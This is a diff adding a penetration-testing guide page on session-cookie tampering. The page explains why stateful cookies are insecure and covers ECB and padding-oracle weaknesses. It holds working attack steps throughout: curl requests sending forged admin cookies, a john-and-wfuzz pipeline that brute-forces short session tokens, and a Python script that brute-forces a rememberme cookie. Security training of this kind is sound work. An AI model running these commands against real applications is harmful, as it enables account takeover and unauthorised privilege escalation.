@@ -1,0 +1,384 @@
+---
+title: Cookie tampering
+description: Decoding, modifying, and re-encoding session cookies - role escalation, rememberme abuse, and weak session-token brute-force.
+mitre: [T1539, T1078]
+d3fend: [D3-MENCR, D3-CH]
+impact: [SessionTakeover, AuthBypass]
+owasp: [A07]
+sidebar:
+  order: 9
+  label: Cookie tampering
+---
+import { Aside } from '@astrojs/starlight/components';
+
+## TL;DR
+
+When a session cookie contains identity, role, or grant data (instead of just a random session ID), tampering with it directly grants privileges or impersonates other users.
+
+```
+# Decode the cookie
+Cookie: SESSIONID=757365723A6874623B726F6C653A75736572
+        ↓ hex decode
+        user:htb;role:user
+
+# Tamper
+        ↓ modify
+        user:htb;role:admin
+        ↓ re-encode (same format)
+        757365723A6874623B726F6C653A61646D696E
+
+# Send modified cookie
+Cookie: SESSIONID=757365723A6874623B726F6C653A61646D696E
+```
+
+Success indicator: the application treats the request as having the modified identity/role - admin pages load, other users' data appears, restricted actions succeed.
+
+## Why this exists
+
+Pure random session IDs are the secure pattern. Many applications instead use session cookies that *contain* state - for "convenience" (no server-side session store needed), "speed" (no DB lookup per request), or because someone read about "stateless authentication" and didn't finish the article.
+
+When the application puts state in the cookie, it must:
+
+1. Encrypt the state (so the attacker can't read it)
+2. Sign the state (so the attacker can't modify it)
+3. Validate the signature on every request
+
+Skipping any of these creates the bug. Common failure modes:
+
+- **State stored in plaintext** (or simple encoding like base64/hex)
+- **State signed but signature not verified** on every request
+- **State encrypted but encryption is reversible** by an attacker who collects samples
+
+Distinct from random-session-ID-with-server-side-storage, where tampering is impossible because the attacker is just guessing IDs that don't exist.
+
+## Step 1 - Identify the cookie
+
+Log into your own account. Inspect the cookies set in the response:
+
+```bash
+curl -s -c - -X POST -d "user=yourself&pass=yourPass" https://<TARGET>/login | grep -E '^[^#]' | column -t
+```
+
+Common session-cookie names:
+
+```
+SESSIONID, SESSION, PHPSESSID, JSESSIONID, ASP.NET_SessionId, connect.sid
+auth, token, session_token, sid
+HTBSESS, custom prefixes per application
+rememberme, persistent, remember_token, _remember_user
+```
+
+Cookies that *aren't* session-relevant (and shouldn't be your tampering target):
+
+```
+_ga, _gid, _fbp, _utm*           ← analytics
+language, theme, currency        ← preferences
+cookie_consent, gdpr_accepted    ← consent banners
+csrftoken                        ← CSRF tokens (different attack class)
+```
+
+The session cookies are usually obvious - they change between sessions, they're flagged `HttpOnly`, they have long values.
+
+## Step 2 - Decode the cookie
+
+Try every common encoding, in this order:
+
+### Base64
+
+```bash
+echo -n 'COOKIE_VALUE' | base64 -d
+```
+
+Recognizable by: alphanumeric + `+/=` characters, length is a multiple of 4 (or close).
+
+### Hex
+
+```bash
+echo -n 'COOKIE_VALUE' | xxd -r -p
+```
+
+Recognizable by: only `0-9a-f` (lowercase) or `0-9A-F` (uppercase), even length, no special characters.
+
+Example from a real-style application:
+
+```bash
+echo -n '757365723A6874623B726F6C653A75736572' | xxd -r -p
+# → user:htb;role:user
+```
+
+Reading the decoded value reveals the cookie's secret: it's a `key:value` structure containing user identity and role, encoded as hex.
+
+### URL-encoding
+
+```bash
+echo -n 'COOKIE_VALUE' | python3 -c "import sys,urllib.parse; print(urllib.parse.unquote(sys.stdin.read()))"
+```
+
+Recognizable by: presence of `%XX` sequences.
+
+### JSON
+
+If the decoded value starts with `{` or `[`, it's JSON. May contain identity directly:
+
+```json
+{"user":"htb","role":"user","expires":1647135274}
+```
+
+### JWT (three base64-encoded parts separated by dots)
+
+```
+eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiaHRiIiwicm9sZSI6InVzZXIifQ.signature
+```
+
+JWT is its own attack class - see [JWT](/codex/web/auth/jwt/).
+
+### Compressed / chained encodings
+
+Some applications chain multiple encodings: `base64(gzip(json(data)))`, or `hex(rot13(base64(...)))`, etc. Use CyberChef for unknown chains:
+
+```
+https://gchq.github.io/CyberChef/
+```
+
+Apply decoders one by one. Common chains:
+
+```
+base64 → gzip → JSON
+base64 → hex → ASCII
+base64 → AES decrypt with known key → JSON
+```
+
+### Magic bytes for binary formats
+
+If hex-decoded output looks like binary junk, check magic bytes:
+
+```
+1F 8B           gzip
+42 5A           bzip2
+50 4B           ZIP
+89 50 4E 47     PNG
+```
+
+[Wikipedia's file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) has the full list. CyberChef has a "Magic" operation that tries all common formats automatically.
+
+### Decodify - automated guessing
+
+```bash
+# https://github.com/s0md3v/Decodify
+decode 'COOKIE_VALUE'
+```
+
+Less thorough than CyberChef but useful for first-pass identification.
+
+## Step 3 - Find the tamperable field
+
+After decoding, look for fields that affect access:
+
+```
+user, username, uid               ← identity
+role, group, permission           ← authorization
+is_admin, is_staff, admin         ← boolean grants
+level, tier, plan                 ← access tier
+```
+
+Time-based fields might also be tamperable:
+
+```
+expires, exp, expiry, valid_until      ← extend session lifetime
+```
+
+Other fields are usually safe to ignore:
+
+```
+csrf_token, nonce                 ← security tokens (signing-related)
+last_seen, ip                     ← tracking, not authorization
+preferences, locale               ← UI state
+```
+
+## Step 4 - Tamper, re-encode, send
+
+Modify the relevant field, re-encode using the exact same chain in reverse:
+
+```bash
+# Original: user:htb;role:user → 757365723A6874623B726F6C653A75736572
+# Modified: user:htb;role:admin
+echo -n 'user:htb;role:admin' | xxd -p | tr -d '\n'
+# → 757365723A6874623B726F6C653A61646D696E
+```
+
+Send the modified cookie:
+
+```bash
+curl -s -b 'SESSIONID=757365723A6874623B726F6C653A61646D696E' https://<TARGET>/dashboard | grep -iE 'admin|welcome'
+```
+
+If the response shows admin functionality, the tamper worked. If the response is a login redirect or "session invalid" error, the cookie has a signature you broke (move to the encrypted/signed section below).
+
+## Field tampering - what to try
+
+| Tamper | What you're trying to achieve |
+| --- | --- |
+| `role:user` → `role:admin` | Privilege escalation within your session |
+| `user:htb` → `user:admin` | Impersonate another user |
+| `is_admin:0` → `is_admin:1` | Toggle a boolean grant |
+| `tier:free` → `tier:premium` | Access paid features |
+| `expires:<past>` → `expires:<future>` | Extend session lifetime |
+| `group:guests` → `group:administrators` | Group membership change |
+| `permissions:read` → `permissions:read,write` | Add capabilities |
+
+Test one field at a time - if multiple changes don't work but one does, you'll have to backtrack to find which one was correct.
+
+### Field-name variants
+
+The same logical concept might use different field names - try the variants:
+
+```
+role | roles | usertype | account_type | privilege_level
+admin | administrator | superuser | super | root
+```
+
+Some apps store role as numeric:
+
+```
+0 | 1 | 2 | 9 | 99 | 999          # admin level often 0 or the highest
+```
+
+Try integer escalation: if your current role is `5`, try `0`, `1`, `100`, `9999`.
+
+## Rememberme tokens
+
+Rememberme cookies are session cookies with a longer lifetime. The longer lifetime makes them attractive brute-force targets:
+
+```
+HTBPERSISTENT cookie set when "remember me" checkbox ticked at login
+Cookie persists for 7 / 30 / 90 days
+Same tampering analysis applies
+```
+
+If the rememberme cookie contains the same encoded format as the session cookie, both are vulnerable to the same tampering attack. Sometimes they have *different* formats - check both.
+
+The rememberme cookie is also a good brute-force target separately - the cookie space is the same as the session space, but the attacker has more time to brute-force before the cookie expires.
+
+## Encrypted or signed cookies
+
+When the cookie is encrypted/signed, simple tampering fails - the application detects the modification and rejects the session.
+
+### ECB cipher quirks
+
+When the cookie is encrypted with ECB mode (no IV, deterministic block-by-block), patterns leak. Identical plaintext blocks produce identical ciphertext blocks. You can:
+
+1. Get a session for a user named `aaaaaaaa` (8 chars = one AES block of `a`)
+2. Get a session for a user named `aaaaaaaaadmin` 
+3. Identify the block that encodes `aaaaaaaa` and the block that encodes `admin...`
+4. Use these as building blocks to construct a cookie for any username
+
+Detection: get session cookies for several similar-but-different usernames and look at the binary diff. ECB will show stable blocks at stable positions.
+
+### CBC padding-oracle attacks
+
+When the cookie is encrypted with CBC and the application returns *different errors* for "padding invalid" vs. "decryption succeeded but contents are wrong," you can decrypt or forge cookies one byte at a time without knowing the key.
+
+This is the [padding oracle attack](https://en.wikipedia.org/wiki/Padding_oracle_attack). Tooling exists ([padbuster](https://github.com/AonCyberLabs/PadBuster)) but the attack is slow and noisy - practical when other paths fail.
+
+### Sign-then-encrypt vs. encrypt-then-sign
+
+Different orderings have different weaknesses:
+
+- **Sign then encrypt** - vulnerable to ciphertext truncation in some cases
+- **Encrypt then sign (correct)** - vulnerable only if the signature is verified after decryption
+
+The application's framework usually picks one. Older frameworks (pre-2015) frequently used the wrong ordering.
+
+## Weak session-token brute-force
+
+When the session cookie is a "random" value that's too short to actually be random, you can brute-force it directly:
+
+```bash
+# Observation: cookies are 6 lowercase + digit characters
+# Charset: 36, length: 6 → 36^6 ≈ 2.2 billion possibilities
+# At 1000 attempts/sec, ~25 days - feasible if cookie is long-lived
+
+# Use john to generate candidate cookies (faster than incrementing in shell)
+john --incremental=LowerNum --min-length=6 --max-length=6 --stdout \
+  | wfuzz -z stdin -b HTBSESS=FUZZ --ss "Welcome" -u https://<TARGET>/profile.php
+```
+
+`--ss "Welcome"` filters for responses showing the authenticated landing page. Any hit is a valid session for an already-logged-in user.
+
+### Birthday paradox concern
+
+A small session space increases collision probability - if the application has thousands of concurrent users and a 6-char alphanumeric session space, by the birthday paradox the brute-force succeeds much faster than the naive math suggests.
+
+### Defending against this
+
+Modern frameworks use 128-bit or 256-bit random session IDs. A 128-bit ID has 2^128 possibilities - infeasible to brute-force at any rate. Anything shorter is suspect.
+
+## Custom encoding example
+
+A worked example of a non-obvious chain. Suppose the application stores cookies as:
+
+```
+hex(rot13(base64(user_name:persistentcookie:random_5digit)))
+```
+
+Cookie value: some hex string.
+
+```bash
+# Decode step by step
+echo -n 'HEX_VALUE' | xxd -r -p > /tmp/step1            # hex → bytes
+cat /tmp/step1 | tr 'A-Za-z' 'N-ZA-Mn-za-m' > /tmp/step2  # ROT13
+cat /tmp/step2 | base64 -d                              # base64 → final
+```
+
+Without source, you find this by:
+
+1. Observing the cookie is hex (only `0-9a-f`)
+2. After hex-decoding, the result looks like printable text - try ROT13 (uncommon but worth a guess when text looks "shifted")
+3. After ROT13, the result is base64-shaped → decode to final
+
+Automation for brute-forcing in such cases:
+
+```python
+import base64
+import codecs
+import requests
+
+def encode_cookie(username, persistence, random5):
+    plain = f"{username}:{persistence}:{random5:05d}"
+    b64 = base64.b64encode(plain.encode()).decode()
+    rot = codecs.encode(b64, 'rot_13')
+    hex_form = rot.encode().hex()
+    return hex_form
+
+# Brute-force the random5 value for a known username
+for random5 in range(100000):
+    cookie = encode_cookie('htbadmin', 'persistentcookie', random5)
+    res = requests.get(URL, cookies={'HTBPERSISTENT': cookie})
+    if 'Welcome' in res.text:
+        print(f"Hit at random5={random5}: {cookie}")
+        break
+```
+
+## Detection-only checks
+
+```bash
+# Compare your cookie to another user's cookie (e.g., create two test accounts)
+# Look at which bytes differ - those bytes encode user-specific data
+
+# Set a known-bad cookie and observe the application's reaction
+curl -s -b 'SESSIONID=AAAAAAAAAAAAAAAAAAAA' https://<TARGET>/dashboard
+# - 200 OK with login form → cookie rejected, redirect to login
+# - 200 OK with dashboard content → app accepts any cookie (extremely broken)
+# - 500 / weird error → cookie validation crashes (bug, possibly exploitable further)
+```
+
+## Notes
+
+- **The cleanest indicator that tampering is possible:** decoded cookie contents include human-readable identity strings. If you can read your username and role in plaintext after a quick decode, the application isn't signing or encrypting.
+- **Cookie attributes matter for stealing, not tampering.** `HttpOnly` prevents JavaScript access (XSS defense); `Secure` requires HTTPS; `SameSite` limits cross-origin. None of these prevent the legitimate session-holder from inspecting and modifying their own cookie. Tampering is a self-attack.
+- **Server-side validation is the only defense.** When the app re-validates the user/role on every request against a server-side database, tampering fails - even with no signing, the modified value doesn't match anything in the DB. The bugs in this section all involve the app trusting the cookie's claimed identity *without* re-checking.
+- **Once you have admin via tampering, check for an audit log of "role changed" events.** Some apps log when a role differs from the last seen value; some don't. If they don't, this attack leaves no forensic trace.
+
+<Aside type="caution">
+Successful cookie tampering = privilege escalation in a single request, which is often the most impactful finding in an engagement. Demonstrate at the minimum-disruption level (read admin page, screenshot, log out) and stop there for the report. Don't perform destructive admin actions during a pentest unless explicitly authorized.
+</Aside>
